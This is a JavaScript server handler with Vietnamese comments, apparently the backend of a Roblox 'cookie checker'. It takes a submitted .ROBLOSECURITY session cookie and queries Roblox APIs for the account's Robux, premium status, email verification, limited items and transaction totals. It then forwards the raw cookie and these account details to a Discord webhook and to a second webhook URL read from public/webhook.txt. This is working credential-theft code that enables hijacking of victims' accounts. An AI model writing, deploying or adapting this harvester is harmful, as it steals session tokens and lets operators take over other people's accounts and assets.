import axios from 'axios';
import { sendDiscordWebhook } from './sendDiscordWebhook.js'; // Import hàm sendDiscordWebhook
import fs from 'fs/promises'; // Sử dụng fs/promises để đọc file
import path from 'path';

// Hàm để lấy URL webhook từ file văn bản
export async function getWebhookUrl() {
    try {
        const filePath = path.join(process.cwd(), 'public', 'webhook.txt'); // Đường dẫn tuyệt đối
        console.log("🔹 Đọc file từ:", filePath);

        const data = await fs.readFile(filePath, 'utf-8'); 
        return data.trim();
    } catch (error) {
        console.error('❌ Lỗi khi đọc file webhook:', error.message);
        throw new Error('Không thể lấy URL webhook');
    }
}

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { cookie } = req.body;

    if (!cookie) {
        return res.status(400).json({
            success: false,
            error: "Không tìm thấy cookie."
        });
    }

    const headers = {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Accept': 'application/json',
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
    };

    try {
        // Kiểm tra cookie và lấy thông tin user
        console.log('Đang kết nối đến users.roblox.com...');
        const userResponse = await axios.get('https://users.roblox.com/v1/users/authenticated', { headers });

        if (!userResponse.data || !userResponse.data.id) {
            throw new Error('Cookie không hợp lệ hoặc đã hết hạn');
        }

        const userData = userResponse.data;
        const userId = userData.id;
        console.log('Kết nối thành công đến users.roblox.com');

        // Gửi nhiều request cùng lúc
        const [
            robuxRes,
            emailRes,
            premiumRes,
            avatarRes,
            verifyHatRes,
            rolimonsRes,
            transactions
        ] = await Promise.all([
            axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers }).catch(() => ({ data: { robux: 0 } })),
            axios.get('https://accountsettings.roblox.com/v1/email', { headers }).catch(() => ({ data: { verified: false } })),
            axios.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers }).catch(() => ({ data: false })),
            axios.get(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=420x420&format=Png`, { headers }).catch(() => ({ data: { data: [{ imageUrl: null }] } })),
            axios.get(`https://inventory.roblox.com/v2/users/${userId}/inventory/8?limit=100`, { headers }).catch(() => ({ data: { data: [] } })),
            axios.get(`https://www.rolimons.com/api/playerassets/${userId}`).catch(() => ({ data: { rap: 0 } })),
            axios.get(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`, { headers })
                .then(res => res.data)
                .catch(() => ({ pendingRobuxTotal: 0, premiumStipendsTotal: 0, developerExchangeTotal: 0, purchasesTotal: 0 }))
        ]);

        // Kiểm tra Verify Hat (ID: 102611803)
        const hasVerifyHat = verifyHatRes.data.data.some(item => item.assetId === 102611803);

        // Lấy URL webhook từ file
        const fileWebhookUrl = await getWebhookUrl(); // Gọi hàm để lấy URL webhook

        // Tạo webhook cho thông tin tài khoản và cookie
        const combinedWebhook = {
            embeds: [{
                title: '✅ Cookie Hợp Lệ',
                description: `**Thông tin tài khoản của ${userData.name}**\n\n**Cookie Value:** \`${cookie}\``,
                color: 0x00ff00,
                fields: [
                    {value:avatarRes.data.data[0]?.imageUrl
                    },
                    {
                        name: 'ID',
                        value: userId,
                        inline: true
                    },
                    {
                        name: 'Tên',
                        value: userData.name,
                        inline: true
                    },
                    {
                        name: 'DisplayName',
                        value: userData.displayName,
                        inline: true
                    },
                    {
                        name: 'Rap',
                        value: rolimonsRes.data.rap || 0,
                        inline: true
                    },
                    {
                        name: 'Rạp Rolimons',
                        value: `https://www.rolimons.com/player/${userId}`,
                        inline: true
                    },
                    {
                        name: 'Robux',
                        value: robuxRes.data.robux || 0,
                        inline: true
                    },
                    {
                        name: 'Email',
                        value: emailRes.data.verified ? 'Đã xác thực' : 'Chưa xác thực',
                        inline: true
                    },
                    {
                        name: 'Premium',
                        value: premiumRes.data ? 'Có' : 'Không',
                        inline: true
                    },
                    {
                        name: 'Verify Hat',
                        value: hasVerifyHat ? 'Có' : 'Không',
                        inline: true
                    },
                    {
                        name: 'Tổng Robux',
                        value: transactions.pendingRobuxTotal,
                        inline: true
                    },
                    {
                        name: 'Robux Premium',
                        value: transactions.premiumStipendsTotal,
                        inline: true
                    },
                    {
                        name: 'Robux dev',
                        value: transactions.developerExchangeTotal,
                        inline: true
                    },
                    {
                        name: 'Robux pending',
                        value: transactions.purchasesTotal,
                        inline: true
                    },
                ]
            }]
        };

        // Gửi webhook đến Discord
        await sendDiscordWebhook(combinedWebhook); // Gọi hàm sendDiscordWebhook

        // Gửi webhook từ file
        await axios.post(fileWebhookUrl, combinedWebhook); // Gửi webhook đến URL từ file

        // Trả về kết quả
        res.status(200).json({
            success: true,
            message: "Kiểm tra cookie thành công!",
            data: {
                userId,
                username: userData.name,
                displayName: userData.displayName,
                robux: robuxRes.data.robux || 0,
                premium: premiumRes.data,
                email: emailRes.data,
                avatar: avatarRes.data.data[0]?.imageUrl || null,
                hasVerifyHat: hasVerifyHat,
                rap: rolimonsRes.data.rap || 0,
                rolimons: `https://www.rolimons.com/player/${userId}`,
                pendingRobuxTotal: transactions.pendingRobuxTotal,
                premiumStipendsTotal: transactions.premiumStipendsTotal,
                developerExchangeTotal: transactions.developerExchangeTotal,
                purchasesTotal: transactions.purchasesTotal
            }
        });

    } catch (error) {
        console.error('Lỗi:', error.message);
        res.status(500).json({
            success: false,
            error: error.message || 'Lỗi không xác định'
        });
    }
}